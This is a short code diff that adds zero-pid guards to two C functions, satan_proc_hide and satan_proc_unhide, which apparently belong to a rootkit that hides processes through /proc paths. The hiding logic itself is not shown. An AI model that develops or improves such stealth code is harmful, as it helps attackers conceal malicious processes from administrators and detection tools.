@@ -18,6 +18,9 @@ static char path_buf[PATH_BUF_SIZE] = {0};
  */
 int satan_proc_hide(unsigned int pid)
 {
+        if (!pid)
+                return 1;
+
         memset(path_buf, 0, PATH_BUF_SIZE);
         snprintf(path_buf, PATH_BUF_SIZE - 1, "/proc/%d", pid);
 
@@ -32,6 +35,9 @@ int satan_proc_hide(unsigned int pid)
  */
 int satan_proc_unhide(unsigned int pid)
 {
+        if (!pid)
+                return 1;
+
         memset(path_buf, 0, PATH_BUF_SIZE);
         snprintf(path_buf, PATH_BUF_SIZE - 1, "/proc/%d", pid);
 
